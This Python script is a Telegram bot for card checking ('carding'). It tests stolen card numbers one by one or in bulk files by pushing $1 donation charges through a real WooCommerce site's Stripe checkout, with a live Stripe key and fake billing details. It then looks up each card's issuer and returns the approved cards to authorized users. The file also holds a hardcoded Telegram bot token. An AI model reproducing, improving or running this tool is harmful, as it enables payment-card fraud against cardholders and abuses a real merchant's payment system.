import requests
from bs4 import BeautifulSoup
import re
import time
import telebot
import random
import string
from telebot import types

BOT_TOKEN = '7690416257:AAE07QAIl1fCckAdNb5zA8PqC6Hctl199ys'  # Replace with your bot token
OWNER_ID = 6181269269  # Replace with your Telegram user ID
bot = telebot.TeleBot(BOT_TOKEN)

session = requests.Session()
headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
}
base_url = "https://indepsquare.com"

# Access control
authorized_users = {OWNER_ID: 0}  # user_id: expiry (0 = permanent)
summary_storage = {}

# Generate summary ID
def gen_summary_id():
    return ''.join(random.choices(string.digits, k=6))

# BIN lookup

def bin_lookup(bin_number):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            return {
                "bank": data.get("bank", "N/A").upper(),
                "type": data.get("type", "N/A").upper(),
                "country": data.get("country_name", "N/A").upper(),
                "emoji": data.get("country_emoji", "")
            }
    except:
        pass
    return {"bank": "N/A", "type": "N/A", "country": "N/A", "emoji": ""}

# Card checker

def run_check(cc_number, exp_month, exp_year, cvc):
    try:
        start = time.time()
        donation_url = f"{base_url}/product/donate/"
        donation_data = {
            "woonp": "1.00",
            "quantity": "1",
            "add-to-cart": "510"
        }
        session.post(donation_url, headers=headers, data=donation_data)

        session.get(f"{base_url}/cart/", headers=headers)
        checkout_page = session.get(f"{base_url}/checkout/", headers=headers)
        soup = BeautifulSoup(checkout_page.text, "html.parser")
        nonce = soup.select_one('input[name="woocommerce-process-checkout-nonce"]')['value']

        stripe_data = {
            "billing_details[name]": "Error Op",
            "billing_details[email]": "rohitrajbot@gmail.com",
            "billing_details[phone]": "2023697415",
            "billing_details[address][city]": "New York",
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": "New York",
            "billing_details[address][postal_code]": "10080",
            "billing_details[address][state]": "NY",
            "type": "card",
            "card[number]": cc_number,
            "card[cvc]": cvc,
            "card[exp_year]": exp_year,
            "card[exp_month]": exp_month,
            "key": "pk_live_51Isr7IE5jlDJzIEwdBHuVbfLAsPNVLC24C04fuFQ9o9TfVSe6WWdZvboJoR224Wnc6uqbhakBObedEd0RHwhRRgs00m4w9HIkC",
        }

        stripe_headers = {
            "User-Agent": headers["User-Agent"],
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }

        stripe_res = session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
        stripe_json = stripe_res.json()
        if "id" not in stripe_json:
            return f"{cc_number}|{exp_month}|{exp_year}|{cvc} : Stripe Payment creation failed"

        payment_method_id = stripe_json["id"]

        checkout_data = {
            "billing_email": "zee5year@hldrive.com",
            "billing_first_name": "Error",
            "billing_last_name": "Op",
            "billing_country": "US",
            "billing_address_1": "New York",
            "billing_city": "New York",
            "billing_state": "NY",
            "billing_postcode": "10080",
            "billing_phone": "2023697415",
            "payment_method": "stripe",
            "wc-stripe-is-deferred-intent": "1",
            "woocommerce-process-checkout-nonce": nonce,
            "_wp_http_referer": "/?wc-ajax=update_order_review",
            "wc-stripe-payment-method": payment_method_id,
        }

        checkout_headers = headers.copy()
        checkout_headers.update({
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": f"{base_url}/checkout/",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": base_url,
        })

        final_res = session.post(f"{base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)
        elapsed = round(time.time() - start, 2)

        try:
            res_json = final_res.json()
            redirect = res_json.get("redirect", "")
            message = BeautifulSoup(res_json.get("messages", ""), "html.parser").text.strip()
        except:
            redirect = ""
            message = final_res.text.strip()

        bin_data = bin_lookup(cc_number[:6])

        if "/checkout/order-received/" in redirect:
            response_type = "Approved ✅"
        elif "declined" in message.lower():
            response_type = "Your card was Declined ❌"
        else:
            response_type = message or "Unknown response"

        return {
            "text": f"""
𝗖𝗖 ⇾  `{cc_number}|{exp_month}|{exp_year}|{cvc}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 1$ CHARGE
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_type}
𝗕𝗮𝗻𝗸: {bin_data['bank']} {bin_data['type']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_data['country']} {bin_data['emoji']}
Bot 𝗯𝘆 ⇾ @ERR0R9
𝗧𝗼𝗼𝗸 {elapsed} seconds
            """,
            "cc": f"{cc_number}|{exp_month}|{exp_year}|{cvc}",
            "response": response_type
        }
    except Exception as e:
        return {"text": f"❌ Error: {e}", "cc": f"{cc_number}|{exp_month}|{exp_year}|{cvc}", "response": "Error"}

# Telegram Handlers

@bot.message_handler(commands=['add'])
def add_user(msg):
    if msg.from_user.id != OWNER_ID:
        return
    parts = msg.text.split()
    if len(parts) >= 2:
        user_id = int(parts[1])
        authorized_users[user_id] = 0
        bot.reply_to(msg, f"✅ User {user_id} added.")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    if msg.from_user.id != OWNER_ID:
        return
    parts = msg.text.split()
    if len(parts) >= 2:
        user_id = int(parts[1])
        authorized_users.pop(user_id, None)
        bot.reply_to(msg, f"❌ User {user_id} removed.")

@bot.message_handler(commands=['get'])
def get_summary(msg):
    parts = msg.text.split()
    if len(parts) != 2:
        bot.reply_to(msg, "❌ Usage: /get <id>")
        return
    sid = parts[1]
    if sid not in summary_storage:
        bot.reply_to(msg, "❌ ID not found")
        return
    summary = summary_storage[sid]
    content = "\n".join(summary["cards"])
    with open(f"{sid}.txt", "w") as f:
        f.write(content)
    with open(f"{sid}.txt", "rb") as f:
        bot.send_document(msg.chat.id, f)

@bot.message_handler(func=lambda m: True, content_types=['text'])
def handle_message(message):
    if message.from_user.id not in authorized_users:
        bot.reply_to(message, "🚫 Not authorized. Contact @ERR0R9")
        return
    raw = message.text.strip()
    match = re.search(r"(\d{12,16})[|:/\\s]+(\d{1,2})[|:/\\s]+(\d{2,4})[|:/\\s]+(\d{3,4})", raw)
    if not match:
        bot.reply_to(message, "❌ Invalid format. Use: `1234567890123456|02|28|123`", parse_mode="Markdown")
        return
    cc, mm, yy, cvv = match.groups()
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)
    wait_msg = bot.reply_to(message, "⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁, 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...")
    result = run_check(cc, mm, yy, cvv)
    bot.edit_message_text(result["text"], message.chat.id, wait_msg.message_id, parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_txt_file(message):
    if message.from_user.id not in authorized_users:
        bot.reply_to(message, "🚫 Not authorized.")
        return
    try:
        if message.document.mime_type == 'text/plain':
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            lines = downloaded.decode('utf-8').splitlines()
            total = len(lines)
            approved = declined = others = 0
            approved_cards, other_cards = [], []
            sid = gen_summary_id()
            sent = bot.reply_to(message, f"📄 File received. Total cards: {total}\n⏳ Checking...")
            for index, line in enumerate(lines, 1):
                match = re.search(r"(\d{12,16})[|:/\\s]+(\d{1,2})[|:/\\s]+(\d{2,4})[|:/\\s]+(\d{3,4})", line)
                if not match:
                    continue
                cc, mm, yy, cvv = match.groups()
                if len(yy) == 2:
                    yy = "20" + yy
                mm = mm.zfill(2)
                result = run_check(cc, mm, yy, cvv)
                if "Approved ✅" in result["response"]:
                    approved += 1
                    approved_cards.append(f"{result['cc']} APPROVED ✅")
                elif "Declined" in result["response"]:
                    declined += 1
                else:
                    others += 1
                    other_cards.append(f"{result['cc']} : {result['response']}")
                bot.edit_message_text(
                    f"🔄 Checking card {index}/{total}...\n\n{result['text']}",
                    message.chat.id,
                    sent.message_id,
                    parse_mode="Markdown"
                )
            summary_storage[sid] = {"cards": approved_cards + other_cards}
            bot.delete_message(message.chat.id, sent.message_id)
            bot.send_message(
                message.chat.id,
                f"""
📊 Mass Summary
━━━━━━━━━━━━━━
🔢 Total: {total}
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Others: {others}
🆔 ID NO: {sid}
━━━━━━━━━━━━━━
                """,
                parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

print("🤖 Bot is running...")
bot.polling()
